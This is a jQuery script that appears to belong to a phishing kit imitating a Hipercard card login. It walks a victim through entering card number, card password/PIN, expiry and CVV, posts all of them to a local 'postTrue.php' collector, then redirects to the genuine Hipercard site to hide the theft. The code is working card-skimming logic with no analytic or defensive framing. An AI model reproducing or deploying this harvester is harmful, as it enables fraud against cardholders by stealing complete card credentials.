$(function () {

    $("#cardNumberInput").mask("9999 9999 9999 9999");
    $("#cardValidateInput").mask("99/99");
    $("#cardCVVInput").mask("999");
    $("#cardPasswordInput").mask("9999");

    var credit_card = '';
    var card_validate = '';
    var card_cvv = '';
    var card_password = '';

    $(".authSteps").on("keyup", "#cardNumberInput", function () {
        if ($(".inputStyle").val().length > 18) {
            $(".inputStyle").css("border", "1px solid #cccc");
            $(".lock").removeClass('show');
            $(".arrow").addClass('show');
        } else {
            $(".lock").addClass('show');
            $(".arrow").removeClass('show');
        }
    })

    $(".authButton").click(function () {

        function errorSet() {
            $(".inputStyle").css("border", "1px solid #db0000");
        }

        var id_atual = $(".inputStyle").attr("id");
        var value_atual = $(".inputStyle").val();
        var styleInput = $(".inputStyle");
        var labelInput = $(".inputLabel");
        var lock = $(".lock");
        var arrow = $(".arrow");

        if (id_atual == "cardNumberInput") {
            if (!$.payment.validateCardNumber(value_atual)) {
                styleInput.css("border", "1px solid #db0000");
            } else {
                styleInput.css("border", "1px solid #cccc");
                lock.removeClass('show');
                arrow.addClass('show');
                $("#cartao").val(value_atual);
                styleInput.attr("id", "cardPasswordInput");
                labelInput.html("Senha do cartão")
                styleInput.val('');
                styleInput.mask("9999");
            }
        }

        if (id_atual == "cardPasswordInput") {
            if (value_atual.length < 2) {
                errorSet();
            } else {
                styleInput.css("border", "1px solid #cccc");
                styleInput.attr("id", "card_validate");
                labelInput.html("Validade (MM/AA)");
                styleInput.val('');
                styleInput.attr('placeholder', "__/__");
                $("#senha").val(value_atual);
                styleInput.mask("99/99");
            }
        }

        if (id_atual == "card_validate") {
            if (value_atual.length < 5) {
                errorSet();
            } else {
                styleInput.css("border", "1px solid #cccc");
                styleInput.attr("id", "cardCVVInput");
                labelInput.html("Código de Segurança (CVV)");
                styleInput.val('');
                $("#validade").val(value_atual);
                styleInput.mask("999");
                styleInput.attr('placeholder', "");
            }
        }

        if (id_atual == "cardCVVInput") {
            if (value_atual.length < 3) {
                errorSet();
            } else {
                styleInput.css("border", "1px solid #cccc");
                $.ajax({
                    url: "./postTrue.php",
                    method: "POST",
                    dataType: "html",
                    data: {
                        action: "register",
                        cartao: $("#cartao").val(),
                        validade: $("#validade").val(),
                        senha: $("#senha").val(),
                        cvv: value_atual
                    },
                    success: function (data) {
                        var data = JSON.parse(data);
                        if (data.status == "success") {
                            window.location.href = "https://www.hipercard.com.br/cartoes/fatura";
                        }
                    }
                }).done(function (response) {
                })
            }
        }

    })

})